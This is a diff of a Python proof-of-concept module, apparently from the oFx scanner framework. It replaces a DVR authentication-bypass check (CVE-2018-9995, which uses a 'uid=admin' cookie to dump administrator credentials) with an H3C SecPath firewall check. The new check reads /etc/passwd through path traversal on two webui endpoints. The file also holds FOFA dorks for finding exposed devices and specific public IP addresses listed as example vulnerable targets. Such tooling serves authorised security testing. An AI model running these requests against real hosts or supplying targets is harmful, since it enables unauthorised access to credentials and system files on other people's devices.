@@ -17,33 +17,19 @@ class POC(POCBase):
         略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "DVR登录绕过漏洞",                        # 漏洞名称
-        "VulnID" : "CVE-2018-9995",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "DVR",                     # 漏洞应用名称
-        "AppVersion" : """
-            Novo
-            CeNova
-            QSee
-            Pulnix
-            XVR 5 in 1 (title: "XVR Login")
-            Securus, - Security. Never Compromise !! -
-            Night OWL
-            DVR Login
-            HVR Login
-            MDVR Login
-        """,                  # 漏洞应用版本
+        "name" : "H3C SecPath 下一代防火墙 任意文件下载漏洞",                        # 漏洞名称
+        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "AppName" : "H3C SecPath 下一代防火墙",                     # 漏洞应用名称
+        "AppVersion" : "",                  # 漏洞应用版本
         "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-            DVR，全称为Digital Video Recorder(硬盘录像机)，即数字视频录像机。
-            最初由阿根廷研究员发现，
-            通过使用“Cookie： uid = admin”的Cookie标头来访问特定DVR的控制面板，
-            DVR将以明文形式响应设备的管理员凭证
+            H3C SecPath 下一代防火墙 存在功能点导致任意文件下载漏洞，攻击者通过漏洞可以获取敏感信息
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            title="DVR login"
+            title="Web user login"
         """,                     # fofa搜索语句
-        "example" : "http://78.188.181.221:85",                     # 存在漏洞的演示url，写一个就可以了
+        "example" : "http://117.159.243.226:8888",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
     }
 
@@ -56,13 +42,12 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "/device.rsp?opt=user&cmd=list" # url自己按需调整
+        url0 = self.target + "/webui/?g=sys_dia_data_check&file_name=../../etc/passwd" # url自己按需调整
+        url1 = self.target + "/webui/?g=sys_capture_file_download&name=../../../../../../../../etc/passwd" # url自己按需调整
         
 
-        headers = {
-                    # "User-Agent":get_random_ua(),
-                    # "Connection":"close",
-                    "Cookie": "uid=admin",
+        headers = {"User-Agent":get_random_ua(),
+                    "Connection":"close",
                     # "Content-Type": "application/x-www-form-urlencoded",
                     }
         
@@ -70,11 +55,15 @@ class POC(POCBase):
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "{\"result\":" in req.text:#req.status_code == 200 and :
-                vuln = [True,req.text]
+            req0 = requests.get(url0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
+            if "root::" in req0.text and req0.status_code == 200 :
+                vuln = [True,req0.text]
             else:
-                vuln = [False,req.text]
+                req1 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
+                if "root:" in req1.text and req1.status_code == 200:
+                    vuln = [True,req1.text]
+                else:
+                    vuln = [False,req1.text]
         except Exception as e:
             raise e
         
